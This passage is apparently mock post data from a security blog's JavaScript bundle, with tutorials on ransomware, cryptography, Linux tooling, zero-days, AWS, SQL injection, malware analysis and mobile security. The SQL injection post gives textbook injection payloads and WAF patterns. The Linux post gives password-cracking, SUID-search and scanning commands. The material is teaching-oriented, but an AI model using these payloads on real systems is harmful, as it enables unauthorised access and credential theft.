Still the primary entry point for ransomware. Attackers craft convincing emails that trick employees into downloading malicious attachments or clicking compromised links.

### 2. Remote Desktop Protocol (RDP) Exploitation
With the rise of remote work, exposed RDP services have become prime targets. Weak or default credentials make these attacks trivial.

### 3. Supply Chain Attacks
Compromising software vendors to distribute ransomware to thousands of downstream customers, as seen in the SolarWinds and Kaseya incidents.

## Modern Ransomware Tactics

### Double Extortion
Attackers not only encrypt data but also exfiltrate it, threatening to publish sensitive information if the ransom isn't paid.

### Ransomware-as-a-Service (RaaS)
Criminal organizations now offer ransomware tools and infrastructure to affiliates, lowering the barrier to entry for cybercriminals.

## Defense Strategies

1. **Regular Backups**: Maintain offline, immutable backups tested regularly
2. **Network Segmentation**: Limit lateral movement within your network
3. **Endpoint Detection & Response (EDR)**: Deploy modern EDR solutions
4. **Employee Training**: Conduct regular phishing simulations
5. **Patch Management**: Keep all systems updated

## Incident Response Plan

Having a solid incident response plan is crucial:

\`\`\`markdown
1. Isolate affected systems immediately
2. Notify your security team and leadership
3. Engage your legal and communications teams
4. Contact law enforcement (FBI IC3)
5. Assess the scope of the breach
6. Begin recovery from clean backups
\`\`\`

## Should You Pay the Ransom?

This is a complex decision. Consider:
- There's no guarantee attackers will provide the decryption key
- Payment funds criminal operations
- You may be targeted again
- Some jurisdictions have made ransom payments illegal

> **Pro Tip:** Engage with a reputable incident response firm before making any decisions.

## Conclusion

Ransomware is a business risk that requires both technical and organizational responses. Invest in prevention, prepare for the worst, and never assume "it won't happen to us."
    `,thumbnail:"https://atakdomain.com/files/blogimages/ec8924ac-83ff-4aba-9e23-8451aa362a92.jpg?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://atakdomain.com/files/blogimages/ec8924ac-83ff-4aba-9e23-8451aa362a92.jpg?auto=format&fit=crop&q=80&w=1000",author:et[2],authorUsername:et[2].username,authorDisplayName:et[2].displayName,authorAvatarUrl:et[2].avatarUrl,category:pt[3],categoryName:pt[3].name,categorySlug:pt[3].slug,tags:[yn[2],yn[4]],createdAt:"2023-10-20T10:30:00Z",publishedAt:"2023-10-20T10:30:00Z",updatedAt:"2023-10-20T10:30:00Z",viewCount:2300,views:2300,likesCount:120,commentCount:34,commentsCount:34,isPublished:!0},{id:3,title:"Introduction to Cryptography",slug:"intro-cryptography",excerpt:"Basics of symmetric and asymmetric encryption.",summary:"Basics of symmetric and asymmetric encryption for beginners.",content:`
## What is Cryptography?

Cryptography is the science of secure communication. It transforms readable data (plaintext) into an unreadable format (ciphertext) and back again, ensuring confidentiality, integrity, and authenticity.

## A Brief History

- **Ancient Times**: Caesar cipher, substitution ciphers
- **World War II**: Enigma machine, breaking of codes
- **1970s**: DES, public-key cryptography invented
- **Modern Era**: AES, RSA, ECC, quantum-resistant algorithms

## Symmetric vs Asymmetric Encryption

### Symmetric Encryption
Uses the same key for encryption and decryption.

**Advantages:**
- Fast performance
- Suitable for large data volumes

**Examples:** AES, DES, 3DES, ChaCha20

\`\`\`python
from cryptography.fernet import Fernet

# Generate a key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
encrypted = cipher.encrypt(b"Secret message")

# Decrypt
decrypted = cipher.decrypt(encrypted)
\`\`\`

### Asymmetric Encryption
Uses a public key for encryption and a private key for decryption.

**Advantages:**
- Solves key distribution problem
- Enables digital signatures

**Examples:** RSA, ECC, ElGamal

\`\`\`python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()
\`\`\`

## Common Cryptographic Concepts

### Hashing
One-way functions that produce fixed-size outputs:
- **MD5**: Deprecated, vulnerable to collisions
- **SHA-256**: Widely used, secure
- **bcrypt**: Password hashing with salt

### Digital Signatures
Prove authenticity and integrity:
1. Sender hashes the message
2. Sender encrypts hash with private key
3. Receiver decrypts with public key
4. Receiver compares hashes

### Key Exchange
Protocols for securely sharing keys:
- **Diffie-Hellman**: Classic key exchange
- **ECDH**: Elliptic curve variant

## Best Practices

1.  Use established libraries (don't roll your own crypto)
2.  Keep keys secure and rotate regularly
3.  Use appropriate key lengths (AES-256, RSA-2048+)
4.  Implement proper key management
5.  Never hardcode keys in source code

## The Future: Post-Quantum Cryptography

Quantum computers threaten current cryptographic systems. NIST has standardized new algorithms:
- **CRYSTALS-Kyber**: Key encapsulation
- **CRYSTALS-Dilithium**: Digital signatures

Start planning your migration strategy now!
    `,thumbnail:"https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=1000",author:et[0],authorUsername:et[0].username,authorDisplayName:et[0].displayName,authorAvatarUrl:et[0].avatarUrl,category:pt[2],categoryName:pt[2].name,categorySlug:pt[2].slug,tags:[yn[5]],createdAt:"2023-11-01T09:15:00Z",publishedAt:"2023-11-01T09:15:00Z",updatedAt:"2023-11-01T09:15:00Z",viewCount:890,views:890,likeCount:25,likesCount:25,commentCount:5,commentsCount:5,isPublished:!0},{id:4,title:"Linux for Hackers: Essential Commands",slug:"linux-for-hackers",excerpt:"Mastering the command line is essential for any security professional.",summary:"Mastering the command line is essential for any security professional.",content:`
## Why Linux for Security?

Linux is the operating system of choice for security professionals. From penetration testing distributions like Kali Linux to server administration, mastering the command line is non-negotiable.

## Essential Commands

### File System Navigation

\`\`\`bash
# List files with details
ls -la

# Navigate directories
cd /path/to/directory

# Show current directory
pwd

# Find files
find / -name "*.conf" 2>/dev/null
\`\`\`

### User & Permission Management

\`\`\`bash
# Current user
whoami

# User details
id

# Change file permissions
chmod 755 script.sh

# Change ownership
chown user:group file.txt
\`\`\`

### Network Commands

\`\`\`bash
# Network interfaces
ip a

# Active connections
netstat -tulpn

# DNS lookup
nslookup target.com

# Trace route
traceroute target.com

# Download files
wget https://example.com/file
curl -O https://example.com/file
\`\`\`

### Process Management

\`\`\`bash
# Running processes
ps aux

# Real-time monitoring
top
htop

# Kill process
kill -9 PID
\`\`\`

## Security-Specific Tools

### Information Gathering

\`\`\`bash
# Port scanning
nmap -sV -sC target.com

# DNS enumeration
dig target.com ANY

# WHOIS lookup
whois target.com
\`\`\`

### Password Cracking

\`\`\`bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat
hashcat -m 0 -a 0 hashes.txt wordlist.txt
\`\`\`

### Web Application Testing

\`\`\`bash
# Directory brute forcing
gobuster dir -u http://target.com -w wordlist.txt

# Nikto scanner
nikto -h http://target.com
\`\`\`

## Useful One-Liners

\`\`\`bash
# Find SUID binaries (privilege escalation)
find / -perm -4000 -type f 2>/dev/null

# Extract all IP addresses from a file
grep -oE '\b([0-9]{1,3}.){3}[0-9]{1,3}\b' file.txt

# Monitor new connections
watch -n 1 'netstat -an | grep ESTABLISHED'

# Base64 decode
echo "SGVsbG8gV29ybGQ=" | base64 -d
\`\`\`

## Scripting Basics

### Bash Script Template

\`\`\`bash
#!/bin/bash

# Variables
TARGET=$1
OUTPUT="scan_results.txt"

# Check argument
if [ -z "$TARGET" ]; then
    echo "Usage: ./scan.sh <target>"
    exit 1
fi

# Run scan
nmap -sV $TARGET > $OUTPUT
echo "Scan complete. Results saved to $OUTPUT"
\`\`\`

## Learning Resources

- **TryHackMe**: Interactive Linux rooms
- **OverTheWire Bandit**: Wargame for beginners
- **Linux Journey**: Free Linux course

> **Practice makes perfect.** Set up a home lab with VirtualBox or VMware and practice these commands daily.
    `,thumbnail:"https://images.unsplash.com/photo-1629654297299-c8506221ca97?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1629654297299-c8506221ca97?auto=format&fit=crop&q=80&w=1000",author:et[1],authorUsername:et[1].username,authorDisplayName:et[1].displayName,authorAvatarUrl:et[1].avatarUrl,category:pt[0],categoryName:pt[0].name,categorySlug:pt[0].slug,tags:[yn[6]],createdAt:"2023-11-05T14:20:00Z",publishedAt:"2023-11-05T14:20:00Z",updatedAt:"2023-11-05T14:20:00Z",viewCount:3400,views:3400,likeCount:210,likesCount:210,commentCount:45,commentsCount:45,isPublished:!0},{id:5,title:"Zero-Day Vulnerabilities Explained",slug:"zero-day-explained",excerpt:"What are zero-day exploits and why are they so dangerous?",summary:"What are zero-day exploits and why are they so dangerous?",content:`
## What is a Zero-Day?

A zero-day (or 0-day) vulnerability is a security flaw that is unknown to the software vendor. The term "zero-day" refers to the fact that developers have had zero days to fix the issue before it's exploited.

## The Zero-Day Lifecycle

\`\`\`
Developer creates code  Vulnerability introduced  
     
Vulnerability discovered by:
 Security Researcher  Responsible disclosure  Patch released
 Malicious Actor  Zero-day exploit  Attacks begin
\`\`\`

## Famous Zero-Day Attacks

### Stuxnet (2010)
- **Target**: Iranian nuclear facilities
- **Exploits Used**: 4 zero-days
- **Impact**: Destroyed ~1,000 centrifuges

### Log4Shell (2021)
- **Target**: Apache Log4j library
- **CVE**: CVE-2021-44228
- **Impact**: Millions of systems worldwide

### Pegasus Spyware
- **Target**: iOS and Android devices
- **Used By**: Nation-states
- **Capability**: Full device takeover

## How Zero-Days Are Discovered

### Bug Bounty Programs
Companies pay researchers for responsibly disclosed vulnerabilities:

| Company | Maximum Payout |
|---------|----------------|
| Apple | $2,000,000 |
| Google | $1,000,000 |
| Microsoft | $250,000 |

### Vulnerability Research
- Fuzzing: Automated input testing
- Code Review: Manual analysis
- Reverse Engineering: Binary analysis

### Underground Markets
Zero-days are sold on dark web markets for hundreds of thousands of dollars.

## Protection Strategies

### Defense in Depth
Layer multiple security controls:

1. **Network Level**: Firewalls, IDS/IPS
2. **Endpoint Level**: EDR, antivirus
3. **Application Level**: WAF, input validation
4. **User Level**: Training, MFA

### Threat Intelligence
Subscribe to threat feeds and monitor for indicators of compromise (IOCs).

### Patch Management
While you can't patch what you don't know about, maintaining a robust patch management program reduces your attack surface.

### Zero Trust Architecture
Never trust, always verify:

\`\`\`

           Zero Trust Model           

  Verify explicitly                  
  Use least privilege access         
  Assume breach                      

\`\`\`

## What To Do If You're Hit

1. **Isolate** affected systems
2. **Preserve** evidence for forensics
3. **Report** to relevant authorities
4. **Communicate** with stakeholders
5. **Remediate** and restore from clean backups
6. **Learn** and improve defenses

## The Future of Zero-Days

With AI-powered security tools and increased investment in vulnerability research, we're seeing faster detection times. However, attackers are also using AI to discover vulnerabilities.

> **Key Takeaway:** Zero-days will always exist. Focus on building resilient systems that can detect and respond to unknown threats.
    `,thumbnail:"https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?auto=format&fit=crop&q=80&w=1000",author:et[2],authorUsername:et[2].username,authorDisplayName:et[2].displayName,authorAvatarUrl:et[2].avatarUrl,category:pt[4],categoryName:pt[4].name,categorySlug:pt[4].slug,tags:[yn[3]],createdAt:"2023-11-10T11:00:00Z",publishedAt:"2023-11-10T11:00:00Z",updatedAt:"2023-11-10T11:00:00Z",viewCount:1200,views:1200,likeCount:67,likesCount:67,commentCount:8,commentsCount:8,isPublished:!0},{id:6,title:"Securing Your Cloud Infrastructure on AWS",slug:"aws-cloud-security",excerpt:"Best practices for securing Amazon Web Services deployments.",summary:"Best practices for securing Amazon Web Services deployments.",content:`
## AWS Security Fundamentals

Amazon Web Services (AWS) is the leading cloud provider, but security requires constant vigilance. This guide covers essential security practices for your AWS infrastructure.

## Identity and Access Management (IAM)

IAM is the foundation of AWS security. Follow the principle of least privilege:

### Key IAM Best Practices

1. **Enable MFA** for root account
2. **Create IAM users** instead of using root
3. **Use IAM roles** for applications and services
4. **Implement SCPs** (Service Control Policies)
5. **Regular credential rotation**

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*"
    }
  ]
}
\`\`\`

## Network Security

### VPC Configuration

- **Subnets**: Public and private segregation
- **Security Groups**: Act as virtual firewalls
- **NACLs**: Network Access Control Lists
- **VPC Flow Logs**: Monitor network traffic

### Security Group Rules

\`\`\`
Inbound:
- HTTP (80): 0.0.0.0/0
- HTTPS (443): 0.0.0.0/0
- SSH (22): Restricted IP range

Outbound:
- All traffic: 0.0.0.0/0
\`\`\`

## Data Protection

### Encryption

**At Rest:**
- S3: Use SSE-S3, SSE-KMS, or client-side encryption
- RDS: Enable encryption by default
- EBS: Enable encryption on volumes

**In Transit:**
- TLS 1.2+ for all data transfers
- HTTPS everywhere
- AWS PrivateLink for internal communication

### Data Retention and Backup

- Enable S3 versioning
- Configure lifecycle policies
- Regular RDS snapshots
- Cross-region backups

## Monitoring and Logging

### CloudTrail
\`\`\`
Every API call to AWS is logged in CloudTrail.
Ensure it's enabled and logs are stored in S3 with MFA Delete protection.
\`\`\`

### CloudWatch
- Set up alarms for unauthorized activity
- Monitor API error rates
- Track failed authentication attempts

### AWS Config
- Continuously monitor resource configurations
- Set up compliance rules
- Receive alerts on non-compliant resources

## Compliance and Auditing

### AWS Security Best Practices

| Service | Security Feature |
|---------|------------------|
| S3 | Block Public Access, ACLs |
| RDS | VPC, encrypted, no default ports |
| Lambda | IAM roles, no hardcoded secrets |
| CloudFront | WAF, DDoS protection |

## Common Mistakes to Avoid

 Leaving default security groups open
 Hardcoding AWS credentials
 Not enabling CloudTrail
 Using root account for daily tasks
 Ignoring security group recommendations
 No encryption on sensitive data

 **DO**: Use AWS Systems Manager Parameter Store or Secrets Manager for credentials

## Incident Response

1. Enable CloudTrail and CloudWatch Logs
2. Set up SNS notifications for alerts
3. Create runbooks for common incidents
4. Regularly test your IR procedures

## Conclusion

AWS security is a shared responsibility. AWS provides the tools and infrastructure; you provide the implementation and monitoring. Stay updated with AWS security announcements and regularly audit your configurations.
    `,thumbnail:"https://images.unsplash.com/photo-1518837695005-2083093ee35b?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1518837695005-2083093ee35b?auto=format&fit=crop&q=80&w=1000",author:et[3],authorUsername:et[3].username,authorDisplayName:et[3].displayName,authorAvatarUrl:et[3].avatarUrl,category:pt[4],categoryName:pt[4].name,categorySlug:pt[4].slug,tags:[yn[0],yn[5]],createdAt:"2023-11-15T09:30:00Z",publishedAt:"2023-11-15T09:30:00Z",updatedAt:"2023-11-15T09:30:00Z",viewCount:2100,views:2100,likeCount:89,likesCount:89,commentCount:22,commentsCount:22,isPublished:!0},{id:7,title:"Advanced SQL Injection Techniques and Defenses",slug:"advanced-sql-injection",excerpt:"Going beyond basic SQL injection attacks and defenses.",summary:"Advanced techniques, blind SQL injection, and comprehensive defense strategies.",content:`
## SQL Injection Evolution

SQL Injection remains one of the most dangerous web vulnerabilities. While basic injection is well-known, advanced techniques continue to evolve.

## Attack Vectors

### Classic Union-Based Injection

\`\`\`sql
' UNION SELECT NULL, username, password FROM users -- 
\`\`\`

### Time-Based Blind SQLi

\`\`\`sql
' OR IF(1=1, SLEEP(5), 0) -- 
\`\`\`

### Error-Based SQLi

Extracting data through database error messages:

\`\`\`sql
' AND extractvalue(rand(), concat(0x3a, (SELECT database()))) -- 
\`\`\`

### Second-Order SQLi

Injection payload stored then executed later:
- User input stored in database
- Data retrieved and used in SQL query
- Attack executes on different user session

## Advanced Defense Techniques

### Parameterized Queries

Always use prepared statements:

\`\`\`python
# Vulnerable
query = f"SELECT * FROM users WHERE id = {user_id}"

# Secure
query = "SELECT * FROM users WHERE id = ?"
execute(query, (user_id,))
\`\`\`

### ORM Frameworks

Use Object-Relational Mapping:

\`\`\`python
# SQLAlchemy
user = User.query.filter_by(username=username).first()

# Django ORM
user = User.objects.filter(username=username).first()
\`\`\`

### Input Validation

Implement whitelist-based validation:

\`\`\`javascript
const allowedSortFields = ['id', 'name', 'date'];
if (!allowedSortFields.includes(sortField)) {
  throw new Error('Invalid sort field');
}
\`\`\`

### Principle of Least Privilege

Database users should have minimal permissions:

\`\`\`sql
-- Web application user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'localhost';
-- NO admin or schema modification rights
\`\`\`

## Detection and Monitoring

### WAF Rules

Web Application Firewalls can block common SQLi patterns:

\`\`\`
Pattern: ' OR '1'='1
Pattern: UNION.*SELECT
Pattern: /**/OR/**/
\`\`\`

### SQL Query Logging

Monitor for suspicious patterns:

\`\`\`
- Multiple error messages
- Unusual table names in queries
- Encoded payloads
- Concatenated strings
\`\`\`

## Real-World Example

### Vulnerable Code

\`\`\`php
<?php
$username = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($link, $query);
?>
\`\`\`

### Attack

\`\`\`
GET /user.php?user=admin' OR '1'='1
\`\`\`

### Secure Version

\`\`\`php
<?php
$username = $_GET['user'];
$stmt = $link->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
?>
\`\`\`

## Testing for SQL Injection

### Manual Testing

1. Add single quotes: \`'\`
2. Try logical operators: \`' OR '1'='1\`
3. Test UNION statements
4. Time-based blind tests
5. Check error messages

### Automated Tools

- SQLmap: Automatic SQL injection testing
- Burp Suite: Manual and automated testing
- OWASP ZAP: Proxy-based scanning

## Conclusion

SQL Injection is preventable with proper coding practices. Never trust user input, always use parameterized queries, and maintain a defense-in-depth approach with WAFs and monitoring.
    `,thumbnail:"https://escape.tech/blog/content/images/size/w2000/2022/06/SQL-Injection-1.png?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://escape.tech/blog/content/images/size/w2000/2022/06/SQL-Injection-1.png?auto=format&fit=crop&q=80&w=1000",author:et[1],authorUsername:et[1].username,authorDisplayName:et[1].displayName,authorAvatarUrl:et[1].avatarUrl,category:pt[1],categoryName:pt[1].name,categorySlug:pt[1].slug,tags:[yn[1],yn[4]],createdAt:"2023-11-18T13:45:00Z",publishedAt:"2023-11-18T13:45:00Z",updatedAt:"2023-11-18T13:45:00Z",viewCount:1876,views:1876,likeCount:76,likesCount:76,commentCount:19,commentsCount:19,isPublished:!0},{id:8,title:"Malware Analysis Fundamentals: Static vs Dynamic Analysis",slug:"malware-analysis-fundamentals",excerpt:"Learn the core techniques for analyzing malicious software safely.",summary:"Comprehensive guide to static and dynamic malware analysis techniques.",content:`
## Why Malware Analysis?

Understanding how malware works is crucial for defense. Whether you're a security researcher or SOC analyst, malware analysis skills are essential.

## Static Analysis

### Overview
Examining malware without executing it. Safe and quick but incomplete.

### Techniques

**File Information:**
\`\`\`bash
file malware.exe
ls -l malware.exe
md5sum malware.exe
\`\`\`

**String Extraction:**
\`\`\`bash
strings malware.exe | grep -i http
strings malware.exe | grep -i registry
\`\`\`

**Entropy Analysis:**
High entropy indicates compression or encryption.

\`\`\`python
import math

def entropy(data):
    entropy = 0.0
    for x in range(256):
        p_x = float(data.count(chr(x))) / len(data)
        if p_x > 0:
            entropy += -p_x * math.log(p_x, 2)
    return entropy
\`\`\`

**Disassembly:**
\`\`\`bash
objdump -d malware.elf | head -50
IDA Pro / Ghidra for GUI disassembly
\`\`\`

### Limitations

- Cannot see runtime behavior
- Packed/encrypted code not analyzed
- Requires reverse engineering skills
- May miss advanced techniques

## Dynamic Analysis

### Overview
Executing malware in controlled environment to observe behavior.

### Lab Setup

**Requirements:**
- Isolated network (no internet access)
- Throwaway VM
- Monitoring tools
- Network sniffer

### Tools

**Process Monitoring:**
- **Procmon**: Windows process activity
- **strace**: Linux system calls
- **frida**: Runtime instrumentation

**File Monitoring:**
- **RegShot**: Registry changes
- **Chkrootkit**: Rootkit detection

**Network Monitoring:**
- **Wireshark**: Packet capture
- **Burp Suite**: HTTP/HTTPS interception

### Execution Steps

1. **Baseline**: Snapshot clean system
2. **Execute**: Run malware
3. **Monitor**: Record all activity
4. **Analyze**: Compare with baseline
5. **Restore**: Revert VM

### Example: Ransomware Analysis

\`\`\`
Observed Behavior:
 Creates .txt files in temp directory
 Connects to C2 server at 192.168.1.100:8080
 Modifies registry: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 Encrypts files with .encrypted extension
 Drops ransom note: ransom.txt
\`\`\`

## Hybrid Approach

Combine both methods for comprehensive analysis:

1. **Start with static**: Quick assessment, no risk
2. **Identify IOCs**: Files, IPs, domains
3. **Dynamic analysis**: Understand behavior
4. **Extraction**: Extract C2 infrastructure
5. **Report**: Document findings

## Common Malware Families

### Trojans
Appears legitimate but grants backdoor access

### Worms
Self-replicating, spreads through networks

### Ransomware
Encrypts data, demands payment

### Rootkits
Hides malicious activity from OS

### Spyware
Exfiltrates sensitive information

## Analysis Tools Comparison

| Tool | Type | Platform | Cost |
|------|------|----------|------|
| IDA Pro | Static | Windows/Linux | $$$ |
| Ghidra | Static | Cross-platform | Free |
| Wireshark | Dynamic | Cross-platform | Free |
| APIMonitor | Dynamic | Windows | Free |
| Cuckoo | Dynamic | Linux | Free |

## Safety Precautions

 **Always:**
- Use isolated lab environment
- Have recovery snapshots
- Assume malware is dangerous
- Start with static analysis
- Document all steps
- Share findings responsibly

## Conclusion

Malware analysis is an art and a science. Start with static analysis, progress to dynamic analysis, and build your skills through practice. Join CTF competitions and online labs to improve your abilities.
    `,thumbnail:"https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=1000",author:et[4],authorUsername:et[4].username,authorDisplayName:et[4].displayName,authorAvatarUrl:et[4].avatarUrl,category:pt[3],categoryName:pt[3].name,categorySlug:pt[3].slug,tags:[yn[2],yn[3]],createdAt:"2023-11-22T10:15:00Z",publishedAt:"2023-11-22T10:15:00Z",updatedAt:"2023-11-22T10:15:00Z",viewCount:1650,views:1650,likeCount:92,likesCount:92,commentCount:28,commentsCount:28,isPublished:!0},{id:9,title:"Mobile Security: Securing iOS and Android Applications",slug:"mobile-security-guide",excerpt:"Best practices for developing secure mobile applications.",summary:"Comprehensive guide to securing iOS and Android mobile apps.",content:`
## Mobile Security Landscape

Mobile devices are primary attack targets. As developers and security professionals, securing mobile apps is critical.

## Common Mobile Vulnerabilities

### OWASP Mobile Top 10

1. **Improper Platform Usage**: Misuse of OS features
2. **Insecure Data Storage**: Unencrypted sensitive data
3. **Insecure Communication**: Unencrypted network traffic
4. **Insecure Authentication**: Weak authentication mechanisms
5. **Insufficient Cryptography**: Poor implementation of crypto
6. **Insecure Authorization**: Weak access controls
7. **Client Code Quality**: Buffer overflows, memory issues
8. **Code Tampering**: Lack of anti-tampering measures
9. **Reverse Engineering**: Insufficient code obfuscation
10. **Extraneous Functionality**: Debug features in production

## iOS Security

### Best Practices

**Secure Data Storage:**
\`\`\`swift
import Security

// Use Keychain for sensitive data
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "username",
    kSecValueData as String: password.data(using: .utf8)!
]
SecItemAdd(query as CFDictionary, nil)
\`\`\`

**Certificate Pinning:**
\`\`\`swift
// Pin certificate to prevent MITM
let policies = [SCPinnedCertificatesTrustPolicy()]
// Validate against pinned certificate
\`\`\`

**Code Signing:**
- Sign your app with Apple developer certificate
- Prevents tampering
- Enables App Store distribution

### Security Features

- **Sandbox**: Apps isolated from each other
- **Code Signing**: Ensures app integrity
- **Encryption**: File-level encryption (FileProtection)
- **Secure Enclave**: Hardware-backed security

## Android Security

### Best Practices

**Secure Preferences:**
\`\`\`kotlin
// Use EncryptedSharedPreferences
val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()

val encryptedPrefs = EncryptedSharedPreferences.create(
    context,
    "secret_shared_prefs",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
\`\`\`

**SSL Pinning:**
\`\`\`kotlin
val certificatePinner = CertificatePinner.Builder()
    .add("example.com", "sha256/...")
    .build()

val client = OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build()
\`\`\`

### Manifest Security

\`\`\`xml
<!-- Restrict application permissions -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.CAMERA" />

<!-- Request runtime permissions for sensitive features -->
<!-- Only request necessary permissions -->
\`\`\`

## Cross-Platform Considerations

### API Security

- Use HTTPS only
- Implement rate limiting
- Require authentication
- Validate all inputs
- Use secure tokens (OAuth 2.0)

### Testing

**Security Testing Tools:**
- **MobSF**: Mobile Security Framework
- **Burp Suite**: Proxy and scanner
- **OWASP ZAP**: Dynamic scanning
- **Frida**: Runtime instrumentation

### Code Obfuscation

\`\`\`
iOS: Use AppThinning, bitcode
Android: Use R8/ProGuard
\`\`\`

## Privacy Considerations

- Collect only necessary data
- Transparent privacy policy
- User consent for tracking
- GDPR / CCPA compliance
- Regular privacy audits

## Secure Development Lifecycle

1. **Requirements**: Include security requirements
2. **Design**: Threat modeling
3. **Development**: Secure coding practices
4. **Testing**: Security testing
5. **Deployment**: Secure release process
6. **Maintenance**: Security patches

## Common Mistakes

 Hardcoding API keys
 Storing passwords in plain text
 Unencrypted network communication
 Trusting user input
 Leaving debug logs in production
 No error handling

 **DO:**
- Use build configurations for secrets
- Implement proper error handling
- Log securely without sensitive data
- Validate all inputs
- Regular security audits

## Conclusion

Mobile security requires diligence at every stage. Implement security by design, stay updated with latest vulnerabilities, and conduct regular security assessments.
    `,thumbnail:"https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&q=80&w=1000",author:et[3],authorUsername:et[3].username,authorDisplayName:et[3].displayName,authorAvatarUrl:et[3].avatarUrl,category:pt[1],categoryName:pt[1].name,categorySlug:pt[1].slug,tags:[yn[0],yn[5]],createdAt:"2023-11-25T14:20:00Z",publishedAt:"2023-11-25T14:20:00Z",updatedAt:"2023-11-25T14:20:00Z",viewCount:1430,views:1430,likeCount:58,likesCount:58,commentCount:15,commentsCount:15,isPublished:!0},{id:10,title:"Network Segmentation: Building Secure Network Architecture",slug:"network-segmentation-guide",excerpt:"Design and implement effective network segmentation strategies.",summary:"Design and implement effective network segmentation to contain threats.",content:`
## What is Network Segmentation?

Network segmentation divides a network into subnetworks (subnets) to improve security, performance, and manageability. Each segment can have different security policies.

## Benefits of Network Segmentation

 **Containment**: Limit lateral movement
 **Performance**: Reduce congestion
 **Compliance**: Meet regulatory requirements
 **Management**: Easier administration
 **Visibility**: Better monitoring

## Segmentation Strategies

### Physical Segmentation

Separate networks using different hardware:
- Different routers/switches
- Dedicated network cables
- Physical firewalls

**Advantages:**
- Maximum security
- Complete isolation

**Disadvantages:**
- High cost
- Limited flexibility
- Hard to scale

### Logical Segmentation

Using VLANs and software:
- VLAN tagging (802.1Q)
- Software-defined networking (SDN)
- Firewall rules

**Advantages:**
- Cost-effective
- Flexible
- Scalable

**Disadvantages:**
- More complex configuration
- Potential misconfigurations

## Common Segmentation Models

### DMZ (Demilitarized Zone)

\`\`\`
[Internet] 
    
  [DMZ] - Web servers, mail servers
    
[Internal Firewall]
    
[Internal Network] - Databases, sensitive data
\`\`\`

### Microsegmentation

Segment at application level:
- Each server: its own segment
- Granular access control
- Zero-trust networking

### User-Based Segmentation

Segment by user role:
- Finance department
- HR department
- Development team
- Executive team

## Implementation

### VLAN Configuration

\`\`\`
VLAN 10 (DMZ):         192.168.10.0/24
VLAN 20 (Internal):    192.168.20.0/24
VLAN 30 (Guest):       192.168.30.0/24
VLAN 40 (Management):  192.168.40.0/24
\`\`\`

### Access Control Lists (ACLs)

\`\`\`
# Allow internal to internet (outbound)
Inbound: VLAN 20  VLAN 10 (Deny)
Outbound: VLAN 20  Internet (Allow)

# Allow DMZ to databases
Inbound: VLAN 10  VLAN 20 Database servers (Allow)

# Block internal from DMZ
Inbound: VLAN 20  VLAN 10 (Deny)
\`\`\`

### Firewall Rules

\`\`\`
Rule 1: Allow DMZ  Internal (port 3306 only)
Rule 2: Allow Internal  Internet
Rule 3: Allow Internet  DMZ (HTTP/HTTPS only)
Rule 4: Deny Internal  DMZ (except Rule 1)
Rule 5: Deny Internal  Guest
\`\`\`

## Advanced Segmentation

### Zero Trust Segmentation

- Verify every user
- Verify every device
- Verify every connection
- Never trust by default

### Micro-Segmentation Architecture

\`\`\`

     Security Policy Engine      

 Identity  Resource Mapping     
 Real-time Threat Detection      
 Continuous Monitoring           

                         
    [App1]    [App2]    [App3]
     Seg1      Seg2      Seg3
\`\`\`

## Monitoring and Enforcement

### Network Traffic Analysis

- Baseline normal traffic
- Alert on anomalies
- Log all segment-crossing traffic
- Use IDS/IPS at segment boundaries

### Compliance Monitoring

\`\`\`bash
# Verify firewall rules
show access-lists

# Check VLAN configuration
show vlan

# Monitor traffic
show interface gigabitethernet 0/1 stats
\`\`\`

## Tools for Segmentation

| Tool | Purpose |
|------|---------|
| Cisco ASA | Firewall & segmentation |
| Palo Alto Networks | Next-gen segmentation |
| Fortinet FortiGate | Unified threat management |
| Zscaler | Cloud-based segmentation |
| Cisco ISE | Identity-based segmentation |

## Common Mistakes

 Over-complex policies
 Not testing before implementation
 Lack of documentation
 No monitoring
 Excessive whitelist of traffic
 Not updating rules regularly

 **DO:**
- Start simple, add complexity gradually
- Document everything
- Test changes in lab first
- Monitor continuously
- Review rules quarterly
- Maintain change log

## Incident Response Impact

With proper segmentation:
- Containment time: Minutes vs. Hours
- Lateral movement: Limited
- Risk reduction: Significant

## Conclusion

